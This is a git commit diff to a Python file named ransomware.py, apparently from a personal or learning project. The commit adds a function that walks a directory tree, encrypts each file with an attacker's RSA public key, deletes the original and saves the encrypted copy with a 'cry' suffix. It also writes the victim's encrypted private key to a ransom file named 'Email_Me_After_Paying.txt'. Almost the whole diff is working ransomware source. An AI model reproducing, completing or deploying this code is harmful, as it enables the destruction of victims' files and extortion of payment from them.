61a0f396a11a542b351c62e60f98ca1dc7ebf01b
Sri Tammineni <sritammineni31@gmail.com>
2021-03-25 21:36:35 -0500

    Function to iterate through the root and replace files with encrypt files (with cry extension).

--- targetclient/ransomware.py
+++ targetclient/ransomware.py
@@ -1,4 +1,5 @@
 import base64
+import os
 import sys
 
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -14,6 +15,8 @@ class Ransomware:
         self.pubkey_pem = None
         self.privkey_pem = None
         self.attacker_public_key = None
+        self.testflag = True
+        self.attackroot = "/home/sri/Documents/PyCode/testFiles"
 
     def generate_asy_keys(self):
         private_key = rsa.generate_private_key(
@@ -32,34 +35,42 @@ class Ransomware:
 
     # Writes clients both keys to the disk. Delete private key section before actual attack.
     def write_keys(self):
-        with open('private_key.pem', 'wb') as f1:
-            f1.write(self.privkey_pem)
-        with open('public_key.pem', 'wb') as f2:
+        if self.testflag:
+            with open('client_private_key.pem', 'wb') as f1:
+                f1.write(self.privkey_pem)
+        with open('client_public_key.pem', 'wb') as f2:
             f2.write(self.pubkey_pem)
-
-    def encrypt_private_key(self):
-        sys.getsizeof(self.privkey_pem)
-        with open('enc_private_key.txt', 'wb') as f:
-            with open("./public.pem", "rb") as key_file:
-                self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
-                                                                                    backend=crypto_default_backend())
-                enc_private_key = self.attacker_public_key.encrypt(self.privkey_pem, crypto_padding.OAEP(
-                    mgf=crypto_padding.MGF1(
-                        algorithm=crypto_hashes.SHA256()),
-                    algorithm=crypto_hashes.SHA256(),
-                    label=None
-                ))
-            f.write(enc_private_key)
-        with open(Path.home() + "/Email_Me_After_Paying.txt", "wb") as fa:
-            fa.write(enc_private_key)
-        self.privkey_pem = None
 
     def enc_private_key(self):
         with open("./public.pem", "rb") as key_file:
             self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                                 backend=crypto_default_backend())
-        encrypt_blob(self.privkey_pem, self.attacker_public_key)
+        enc_blob = encrypt_blob(self.privkey_pem, self.attacker_public_key)
+        with open("./Email_Me_After_Paying.txt", "wb") as fa:
+            fa.write(enc_blob)
         self.privkey_pem = None
+
+    def encrypt_system(self):
+        arr = os.walk(self.attackroot, topdown=True)
+        for root, directory, files in arr:
+            for file in files:
+                file_path = os.path.join(root, file)
+                enc_file_blob = enc_file(file_path)
+                os.remove(file_path)
+                file_path = file_path + "cry"
+                print(file_path)
+                with open(file_path, 'wb') as fp:
+                    fp.write(enc_file_blob)
+
+
+def enc_file(filepath):
+    with open("./public.pem", "rb") as key_file:
+        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
+                                                                       backend=crypto_default_backend())
+    with open(filepath, 'rb') as f:
+        fileblob = f.read()
+    enc_blob = encrypt_blob(fileblob, attacker_public_key)
+    return enc_blob
 
 
 def encrypt_blob(fileblob, attacker_public_key):
@@ -72,7 +83,7 @@ def encrypt_blob(fileblob, attacker_public_key):
         if len(chunk) % chunk_size != 0:
             end_loop = True
             chunk += b" " * (chunk_size - len(chunk))
-        print(chunk)
+        # print(chunk)
         enc_chunk = attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
             mgf=crypto_padding.MGF1(
                 algorithm=crypto_hashes.SHA256()),
@@ -82,9 +93,7 @@ def encrypt_blob(fileblob, attacker_public_key):
         encrypted += enc_chunk
         offset += chunk_size
     encrypted_blob = base64.b64encode(encrypted)
-    with open("./Email_Me_After_Paying.txt", "wb") as fa:
-        fa.write(encrypted_blob)
-    print(encrypted_blob)
+    return encrypted_blob
 
 
 def main():
@@ -92,6 +101,8 @@ def main():
     foo.generate_asy_keys()
     foo.write_keys()
     foo.enc_private_key()
+    foo.encrypt_system()
+    #print(arr)
 
 
 if __name__ == '__main__':
